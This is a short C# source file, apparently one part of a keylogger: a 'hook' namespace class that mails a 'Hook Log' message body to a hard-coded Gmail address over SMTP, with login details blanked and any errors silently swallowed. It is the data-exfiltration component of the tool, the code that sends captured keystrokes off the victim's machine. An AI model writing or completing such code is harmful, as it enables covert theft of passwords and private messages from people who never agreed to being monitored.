using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Net.Mail;
using System.Text;
using System.Threading.Tasks;

namespace hook
{
    class SendMail
    {
        public static void SendToMusthaan( string messageBody)
        {
            
                string address = "@gmail.com";
                string host = "smtp.gmail.com";
                int num = 587;
                string userName ="";
                string password = "pwd";
                try
                {
                    MailMessage message = new MailMessage
                    {
                        From = new MailAddress(address)
                    };
                    message.To.Add("@gmail.com");
                    message.Subject = "Hook Log";
                    message.Body = messageBody;
                    SmtpClient client = new SmtpClient(host)
                    {
                        Port = num,
                        Host = host,
                        UseDefaultCredentials = false,
                        Credentials = new NetworkCredential(userName, password),
                        EnableSsl = true
                    };
                    message.IsBodyHtml = true;
                    client.Send(message);
                    messageBody = string.Empty;
                }
                catch (Exception exception)
                {
                   
                }
            
        }
    }
}
